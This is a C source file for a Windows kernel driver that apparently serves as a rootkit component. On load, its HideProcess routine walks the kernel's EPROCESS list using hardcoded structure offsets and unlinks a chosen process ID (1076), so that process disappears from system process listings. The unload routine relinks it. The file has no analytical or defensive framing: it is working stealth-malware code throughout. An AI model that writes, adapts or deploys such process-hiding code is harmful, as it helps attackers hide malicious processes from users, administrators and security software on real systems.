#include "rkep.h"

VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING DeviceLinkString;
    KdPrint(("Driver Unload() Called...\n"));
    RtlInitUnicodeString(&DeviceLinkString, DOS_DEVICE_NAME);
    IoDeleteSymbolicLink(&DeviceLinkString);
    IoDeleteDevice(DriverObject->DeviceObject);
    pList->Blink->Flink = pList;
    pList->Flink->Blink = pList;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING theRegistryPath)
{
    NTSTATUS ntStatus = STATUS_SUCCESS;
    UNICODE_STRING ntDeviceName;
    UNICODE_STRING DeviceLinkString;
    PDEVICE_OBJECT DeviceObject = NULL;
    ULONG Index = 0;

    RtlInitUnicodeString(&ntDeviceName, DEVICE_NAME);
    RtlInitUnicodeString(&DeviceLinkString, DOS_DEVICE_NAME);

    ntStatus = IoCreateDevice(DriverObject, 0, &ntDeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
    if (!NT_SUCCESS(ntStatus))
    {
        KdPrint(("Cannot Create Device...\n"));
        return ntStatus;
    }

    ntStatus = IoCreateSymbolicLink(&DeviceLinkString, &ntDeviceName);
    if (!NT_SUCCESS(ntStatus))
    {
        KdPrint(("Cannot Symbolic Link...\n"));
        return ntStatus;
    }

    for (Index = 0; Index < IRP_MJ_MAXIMUM_FUNCTION; Index++)
        DriverObject->MajorFunction[Index] = Dispatch;
    DriverObject->DriverUnload = OnUnload;

    KdPrint(("Driver DriverEntry Called...\n"));
    return HideProcess();
}

NTSTATUS Dispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    NTSTATUS ntStatus = STATUS_NOT_SUPPORTED;
    KdPrint(("Driver Dispath Called...\n"));
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return ntStatus;
}

NTSTATUS HideProcess()
{
    PEPROCESS ePro = NULL;
    int terminate_PID = 1076;
    int start_PID;
    int current_PID;
    int iCount = 0;
    PEPROCESS HidePro = NULL;
    ePro = PsGetCurrentProcess();

    start_PID = *((int*)((PUCHAR)ePro + 0x84));
    current_PID = start_PID;

    while (1)
    {
        if (current_PID == terminate_PID)
        {
            HidePro = ePro;
            break;
        }
        else if ((iCount >= 1) && (start_PID == current_PID))
        {
            HidePro = NULL;
            break;
        }
        else
        {
            pList = (PLIST_ENTRY)((PUCHAR)ePro + 0x88);
            ePro = (PEPROCESS)((PUCHAR)pList->Flink);
            ePro = (PEPROCESS)((PUCHAR)ePro - 0x88);
            current_PID = *((int*)((PUCHAR)ePro + 0x84));
            iCount++;
        }
    }

    if (!HidePro)
        return STATUS_SUCCESS;

    pList = (PLIST_ENTRY)((PUCHAR)HidePro + 0x88);
    pList->Blink->Flink = pList->Flink;
    pList->Flink->Blink = pList->Blink;

    return STATUS_SUCCESS;
}
